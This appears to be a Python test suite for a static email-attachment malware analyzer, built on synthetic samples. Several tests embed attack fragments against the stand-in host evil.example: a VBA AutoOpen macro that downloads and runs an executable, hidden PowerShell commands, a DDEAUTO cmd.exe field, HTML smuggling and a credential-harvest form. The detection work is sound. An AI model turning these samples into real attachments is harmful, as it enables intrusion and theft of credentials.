"""Tests for static attachment analysis, using synthetic in-memory samples."""
import hashlib
import random
import unittest

from src.attachments import RawAttachment, analyze_attachments, lookup_hashes, merge_into_iocs
from src.attachments.analyzer import analyze_file
from src.attachments.cfb import CFBError, CompoundFile
from src.ioc_extractor import ExtractedIOCs
from tests.support import (
    make_cfb, make_docx, make_pdf, make_pe, make_vba_project, make_xls_workbook_stream, make_zip,
    vba_module_stream,
)


def signals(result):
    return {s["signal"]: s["severity"] for s in result["signals"]}


class HashingAndTypeTests(unittest.TestCase):
    def test_hashes_and_basic_fields(self):
        data = b"hello world\n"
        r = analyze_file("notes.txt", data)
        self.assertEqual(r["sha256"], hashlib.sha256(data).hexdigest())
        self.assertEqual(r["md5"], hashlib.md5(data).hexdigest())
        self.assertEqual(r["detected_type"], "text")
        self.assertEqual(r["static_risk"], "none")

    def test_plain_pdf_with_no_features_is_clean(self):
        r = analyze_file("report.pdf", make_pdf("1 0 obj << /Type /Page >> endobj"))
        self.assertEqual(r["detected_type"], "pdf")
        self.assertEqual(r["static_risk"], "none")


class FilenameTrickTests(unittest.TestCase):
    def test_double_extension(self):
        r = analyze_file("invoice.pdf.exe", make_pe())
        self.assertEqual(signals(r)["double_extension"], "high")
        self.assertEqual(signals(r)["windows_executable"], "high")

    def test_padded_extension(self):
        r = analyze_file("invoice.pdf" + " " * 40 + ".exe", make_pe())
        self.assertIn("double_extension", signals(r))

    def test_right_to_left_override_is_visible_and_flagged(self):
        name = "invoice_\u202etxt.exe"
        r = analyze_file(name, make_pe())
        self.assertEqual(signals(r)["bidi_filename_trick"], "high")
        self.assertIn("<U+202E>", r["filename"])
        self.assertNotIn("\u202e", r["filename"])

    def test_executable_disguised_as_pdf(self):
        r = analyze_file("statement.pdf", make_pe())
        self.assertEqual(signals(r)["disguised_executable"], "high")

    def test_docx_that_is_really_rtf(self):
        r = analyze_file("letter.docx", b"{\\rtf1\\ansi hello}")
        self.assertEqual(signals(r)["type_mismatch"], "medium")


class ExecutableTests(unittest.TestCase):
    def test_pe_details_and_strings(self):
        pe = make_pe(b"powershell -enc AAAA http://evil.example/payload.bin\x00")
        r = analyze_file("setup.exe", pe)
        self.assertEqual(r["detected_type"], "pe")
        self.assertIn("powershell", r["details"]["pe_strings"]["suspicious_strings"])
        self.assertIn("http://evil.example/payload.bin", r["urls"])
        self.assertEqual(r["details"]["pe"]["sections"][0]["name"], ".text")
        self.assertEqual(r["static_risk"], "high")

    def test_dll_flag(self):
        r = analyze_file("lib.dll", make_pe(dll=True))
        self.assertTrue(r["details"]["pe"]["is_dll"])

    def test_lnk_with_powershell(self):
        header = b"\x4c\x00\x00\x00\x01\x14\x02\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46"
        cmd = "powershell.exe -nop -w hidden http://evil.example/a.ps1".encode("utf-16-le")
        r = analyze_file("scan.lnk", header + b"\x00" * 60 + cmd)
        self.assertEqual(signals(r)["shortcut_file"], "high")
        self.assertEqual(signals(r)["shortcut_runs_commands"], "high")
        self.assertIn("http://evil.example/a.ps1", r["urls"])

    def test_script_attachment(self):
        js = b"var x = new ActiveXObject('WScript.Shell'); x.Run('powershell -enc AAAAAAAAAAAAAAAAAAAAAAAA');"
        js += b"\nvar u='http://evil.example/drop.exe';"
        r = analyze_file("update.js", js)
        self.assertEqual(signals(r)["script_attachment"], "high")
        self.assertIn("http://evil.example/drop.exe", r["urls"])

    def test_iso_by_content(self):
        iso = b"\x00" * 0x8001 + b"CD001" + b"\x00" * 100
        r = analyze_file("scan.iso", iso)
        self.assertEqual(signals(r)["disk_image_attachment"], "high")


class PdfTests(unittest.TestCase):
    def test_javascript_with_open_action(self):
        pdf = make_pdf("1 0 obj << /OpenAction << /S /JavaScript /JS (app.alert\\(1\\)) >> >> endobj")
        r = analyze_file("a.pdf", pdf)
        self.assertEqual(signals(r)["pdf_javascript_autorun"], "high")

    def test_obfuscated_name_is_decoded(self):
        pdf = make_pdf("1 0 obj << /OpenAction << /S /Java#53cript /J#53 (x) >> >> endobj")
        r = analyze_file("a.pdf", pdf)
        self.assertEqual(signals(r)["pdf_javascript_autorun"], "high")

    def test_keywords_inside_compressed_stream_are_found(self):
        pdf = make_pdf("1 0 obj << /Type /Catalog >> endobj",
                       compress_extra="<< /S /Launch /F (cmd.exe) >> /URI (http://evil.example/x)")
        r = analyze_file("a.pdf", pdf)
        self.assertEqual(signals(r)["pdf_launch_action"], "high")
        self.assertIn("http://evil.example/x", r["urls"])

    def test_embedded_file_and_links(self):
        pdf = make_pdf("1 0 obj << /EmbeddedFile >> /Type /Page /URI (http://example.org/a) endobj")
        r = analyze_file("a.pdf", pdf)
        self.assertEqual(signals(r)["pdf_embedded_file"], "medium")
        self.assertIn("http://example.org/a", r["urls"])


class OfficeTests(unittest.TestCase):
    def test_docx_with_autoexec_macro_downloading(self):
        src = ('Sub AutoOpen()\r\n  Set x = CreateObject("MSXML2.XMLHTTP")\r\n'
               '  x.Open "GET", "http://evil.example/p.exe"\r\n  Shell "cmd /c p.exe"\r\nEnd Sub')
        r = analyze_file("invoice.docm", make_docx(macro_source=src))
        s = signals(r)
        self.assertEqual(s["vba_autoexec_suspicious"], "high")
        self.assertIn("http://evil.example/p.exe", r["urls"])
        self.assertIn("AutoOpen", r["details"]["vba"]["auto_exec_entry_points"])

    def test_macros_in_file_named_docx(self):
        r = analyze_file("invoice.docx", make_docx(macro_source="Sub x()\r\nEnd Sub"))
        self.assertEqual(signals(r)["macros_hidden_behind_plain_extension"], "high")

    def test_clean_docx_has_no_signals(self):
        r = analyze_file("memo.docx", make_docx())
        self.assertEqual(r["static_risk"], "none")
        self.assertEqual(r["details"]["office_flavor"], "word")

    def test_remote_template_injection(self):
        r = analyze_file("offer.docx", make_docx(external_rels=[("attachedTemplate", "http://evil.example/t.dotm")]))
        self.assertEqual(signals(r)["remote_content_link"], "high")
        self.assertIn("http://evil.example/t.dotm", r["urls"])

    def test_unc_link_leaks_credentials(self):
        r = analyze_file("a.docx", make_docx(external_rels=[("oleObject", "\\\\\\\\evil.example\\\\share\\\\x")]))
        self.assertIn("unc_or_file_link", signals(r))

    def test_ordinary_hyperlink_is_not_flagged_but_is_collected(self):
        r = analyze_file("a.docx", make_docx(external_rels=[("hyperlink", "https://example.org/page")]))
        self.assertEqual(r["static_risk"], "none")
        self.assertIn("https://example.org/page", r["urls"])

    def test_namespace_urls_are_ignored(self):
        r = analyze_file("a.docx", make_docx())
        self.assertEqual(r["urls"], [])

    def test_dde_field(self):
        xml = ('<w:document><w:r><w:instrText xml:space="preserve"> DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe '
               '"/k calc.exe" </w:instrText></w:r></w:document>')
        r = analyze_file("a.docx", make_docx(document_xml=xml))
        self.assertEqual(signals(r)["dde_field"], "high")

    def test_embedded_executable_in_package(self):
        r = analyze_file("a.docx", make_docx(extra={"word/embeddings/payload.exe": b"MZ"}))
        self.assertEqual(signals(r)["embedded_executable"], "high")

    def test_macro_content_type_without_vba_part(self):
        ct = ('<Types xmlns="x"><Override PartName="/xl/workbook.xml" '
              'ContentType="application/vnd.ms-excel.sheet.macroEnabled.main+xml"/></Types>')
        pkg = make_zip({"[Content_Types].xml": ct, "xl/workbook.xml": "<workbook/>"})
        r = analyze_file("sheet.xlsx", pkg)
        self.assertEqual(signals(r)["macros_hidden_behind_plain_extension"], "high")

    def test_excel4_macro_sheet_hidden_in_ooxml(self):
        pkg = make_zip({"[Content_Types].xml": "<Types/>", "xl/workbook.xml": '<sheet state="veryHidden"/>',
                        "xl/macrosheets/sheet1.xml": "<x/>"})
        r = analyze_file("a.xlsm", pkg)
        self.assertEqual(signals(r)["excel4_macro_sheet_hidden"], "high")

    def test_legacy_doc_with_macros(self):
        src = "Sub Document_Open()\r\n  Shell \"powershell -enc AAAA\"\r\nEnd Sub"
        cfb = make_cfb({"WordDocument": b"\x00" * 100,
                        "Macros/VBA/ThisDocument": vba_module_stream(src),
                        "Macros/VBA/dir": b"\x01\x00", "Macros/VBA/_VBA_PROJECT": b"\xcc\x61"})
        r = analyze_file("cv.doc", cfb)
        self.assertEqual(r["details"]["ole_flavor"], "word")
        self.assertEqual(signals(r)["vba_autoexec_suspicious"], "high")

    def test_legacy_excel_hidden_xlm_macro_sheet(self):
        cfb = make_cfb({"Workbook": make_xls_workbook_stream([(0, 0, "Sheet1"), (1, 2, "Macro1")])})
        r = analyze_file("q3.xls", cfb)
        self.assertEqual(signals(r)["excel4_macro_sheet_hidden"], "high")
        self.assertEqual(r["details"]["xlm_sheets"], ["Macro1"])

    def test_password_protected_office(self):
        r = analyze_file("a.docx", make_cfb({"EncryptedPackage": b"x" * 64, "EncryptionInfo": b"y" * 16}))
        self.assertEqual(signals(r)["password_protected_office"], "medium")

    def test_embedded_runnable_in_ole(self):
        native = b"\x20\x00\x00\x00\x02\x00" + b"setup.exe\x00C:\\temp\\setup.exe\x00" + b"\x00" * 40
        cfb = make_cfb({"WordDocument": b"\x00" * 50, "ObjectPool/1/Ole10Native": native})
        r = analyze_file("a.doc", cfb)
        self.assertEqual(signals(r)["embedded_executable"], "high")

    def test_rtf_equation_and_template(self):
        rtf = b"{\\rtf1{\\*\\template http://evil.example/t.dot}{\\object\\objemb{\\*\\objclass Equation.3}{\\*\\objdata 0105}}}"
        r = analyze_file("a.rtf", rtf)
        s = signals(r)
        self.assertEqual(s["rtf_equation_editor"], "high")
        self.assertEqual(s["remote_template"], "high")


class WebTests(unittest.TestCase):
    def test_credential_harvest_page(self):
        html = (b'<html><body><form action="https://evil.example/post.php" method="post">'
                b'<input type="password" name="p"></form></body></html>')
        r = analyze_file("secure_message.html", html)
        self.assertEqual(signals(r)["credential_harvest_form"], "high")
        self.assertIn("https://evil.example/post.php", r["urls"])

    def test_html_smuggling(self):
        html = (b"<script>var b=new Blob([atob('AAAA')],{type:'application/octet-stream'});"
                b"var a=document.createElement('a');a.href=URL.createObjectURL(b);a.download='x.zip';</script>")
        r = analyze_file("doc.html", html)
        self.assertEqual(signals(r)["html_smuggling"], "high")

    def test_svg_with_script(self):
        r = analyze_file("logo.svg", b'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><script>1</script></svg>')
        self.assertEqual(signals(r)["svg_script"], "high")
        self.assertEqual(r["urls"], [])  # namespace URL is not a link


class ArchiveTests(unittest.TestCase):
    def test_zip_with_executable_inside(self):
        z = make_zip({"readme.txt": "hi", "invoice.pdf.exe": make_pe(b"http://evil.example/c2")})
        r = analyze_file("docs.zip", z)
        s = signals(r)
        self.assertEqual(s["archive_contains_runnable"], "high")
        member = next(m for m in r["members"] if m["filename"].endswith(".exe"))
        self.assertEqual(member["detected_type"], "pe")
        self.assertIn("http://evil.example/c2", member["urls"])
        self.assertEqual(r["static_risk"], "high")

    def test_encrypted_zip_flagged_without_unpacking(self):
        z = make_zip({"invoice.xls": b"\x00" * 50}, flag_encrypted={"invoice.xls"})
        r = analyze_file("pay.zip", z)
        self.assertEqual(signals(r)["encrypted_archive"], "medium")
        self.assertFalse(r["members"][0]["analyzed"])

    def test_macro_doc_inside_zip_bubbles_up(self):
        z = make_zip({"offer.docm": make_docx(macro_source="Sub AutoOpen()\r\n Shell \"x\"\r\nEnd Sub")})
        r = analyze_file("offer.zip", z)
        self.assertEqual(r["static_risk"], "high")
        self.assertEqual(r["members"][0]["static_risk"], "high")

    def test_nesting_depth_is_limited(self):
        inner = b"payload"
        for _ in range(5):
            inner = make_zip({"inner.zip": inner})
        r = analyze_file("deep.zip", inner)  # must terminate and not blow up
        self.assertTrue(r["analyzed"])

    def test_decompression_bomb_not_unpacked(self):
        z = make_zip({"zeros.bin": b"\x00" * (30 * 1024 * 1024)})
        r = analyze_file("bomb.zip", z)
        self.assertEqual(signals(r)["compression_bomb"], "high")
        self.assertFalse(r["members"][0]["analyzed"])

    def test_rar_is_noted_not_inspected(self):
        r = analyze_file("a.rar", b"Rar!\x1a\x07\x00" + b"\x00" * 50)
        self.assertEqual(signals(r)["archive_not_inspected"], "low")

    def test_attached_eml_is_opened(self):
        from email.message import EmailMessage
        m = EmailMessage()
        m["From"], m["To"], m["Subject"] = "a@example.org", "b@example.org", "Fwd: urgent"
        m.set_content("Click http://evil.example/login now")
        m.add_attachment(b"WScript.Shell run", maintype="application", subtype="octet-stream", filename="x.js")
        r = analyze_file("forwarded.eml", m.as_bytes())
        self.assertEqual(r["detected_type"], "eml")
        self.assertIn("http://evil.example/login", r["urls"])
        self.assertEqual(r["details"]["inner_email"]["subject"], "Fwd: urgent")
        self.assertEqual(r["members"][0]["filename"], "x.js")
        self.assertEqual(r["static_risk"], "high")


class RobustnessTests(unittest.TestCase):
    def test_garbage_never_raises(self):
        rng = random.Random(1234)
        samples = [make_docx(macro_source="Sub AutoOpen()\r\nEnd Sub"), make_pe(), make_pdf("/JS (x)"),
                   make_cfb({"WordDocument": b"1" * 100, "Macros/VBA/dir": b"x"}), make_zip({"a.exe": b"MZ"})]
        for sample in samples:
            for _ in range(40):
                data = bytearray(sample)
                for _ in range(rng.randint(1, 20)):
                    data[rng.randrange(len(data))] = rng.randrange(256)
                if rng.random() < 0.3:
                    data = data[:rng.randrange(1, len(data))]
                result = analyze_file("sample.bin", bytes(data))
                self.assertTrue(result["analyzed"])

    def test_cfb_mutations_only_raise_cfb_error(self):
        rng = random.Random(99)
        base = make_vba_project("Sub AutoOpen()\r\nEnd Sub")
        for _ in range(300):
            data = bytearray(base)
            for _ in range(rng.randint(1, 12)):
                data[rng.randrange(len(data))] = rng.randrange(256)
            try:
                cfb = CompoundFile(bytes(data))
                for path in list(cfb.streams):
                    cfb.read_stream(path)
            except CFBError:
                pass

    def test_empty_and_tiny_files(self):
        for data in (b"", b"A", b"MZ", b"PK\x03\x04", b"%PDF-"):
            self.assertTrue(analyze_file("x", data)["analyzed"])


class ReportLevelTests(unittest.TestCase):
    def test_password_in_body_with_encrypted_archive(self):
        z = make_zip({"invoice.exe": b"MZ"}, flag_encrypted={"invoice.exe"})
        report = analyze_attachments([RawAttachment("pay.zip", "application/zip", z, len(z))],
                                     email_body="The password is 1234")
        self.assertIn("encrypted_attachment_with_password_in_body", {s["signal"] for s in report["email_signals"]})
        self.assertEqual(report["static_risk"], "high")

    def test_encrypted_archive_without_password_hint(self):
        z = make_zip({"a.txt": b"x"}, flag_encrypted={"a.txt"})
        report = analyze_attachments([RawAttachment("a.zip", "", z, len(z))], email_body="see attached")
        self.assertNotIn("encrypted_attachment_with_password_in_body", {s["signal"] for s in report["email_signals"]})

    def test_skipped_and_excess_attachments_are_reported(self):
        atts = [RawAttachment("big.bin", "", b"", 99_000_000, skipped_reason="larger than the 25 MB limit")]
        atts += [RawAttachment(f"f{i}.txt", "", b"hi", 2) for i in range(12)]
        report = analyze_attachments(atts)
        self.assertEqual(report["count"], 13)
        self.assertFalse(report["files"][0]["analyzed"])
        self.assertIn("attachments_not_analysed", {s["signal"] for s in report["email_signals"]})
        self.assertFalse(report["files"][-1]["analyzed"])

    def test_merge_urls_into_iocs_front_of_list(self):
        report = analyze_attachments([RawAttachment("a.docx", "", make_docx(
            external_rels=[("hyperlink", "https://phish.example/login")]), 1)])
        iocs = ExtractedIOCs(urls=["http://body.example/x"], domains=["body.example"])
        added = merge_into_iocs(iocs, report)
        self.assertEqual(added, 1)
        self.assertEqual(iocs.urls[0], "https://phish.example/login")
        self.assertIn("phish.example", iocs.domains)
        self.assertEqual(merge_into_iocs(iocs, report), 0)  # idempotent

    def test_virustotal_lookup_prioritises_risky_and_respects_cap(self):
        class FakeVT:
            def __init__(self):
                self.calls = []

            def check_hash(self, sha):
                self.calls.append(sha)
                return {"found": False}

        atts = [RawAttachment("pic.png", "", b"\x89PNG\r\n\x1a\n" + b"1" * 50, 58)]  # benign image: skipped
        atts += [RawAttachment(f"a{i}.exe", "", make_pe(bytes([65 + i])), 1) for i in range(7)]
        report = analyze_attachments(atts)
        vt = FakeVT()
        made = lookup_hashes(report, vt, max_lookups=5)
        self.assertEqual(made, 5)
        self.assertEqual(len(vt.calls), 5)
        png = report["files"][0]
        self.assertNotIn("virustotal", png)
        limited = [f for f in report["files"][1:] if "skipped" in f.get("virustotal", {})]
        self.assertEqual(len(limited), 2)

    def test_virustotal_lookup_survives_errors(self):
        class BoomVT:
            def check_hash(self, sha):
                raise RuntimeError("boom")

        report = analyze_attachments([RawAttachment("a.exe", "", make_pe(), 1)])
        lookup_hashes(report, BoomVT())
        self.assertIn("error", report["files"][0]["virustotal"])


if __name__ == "__main__":
    unittest.main()
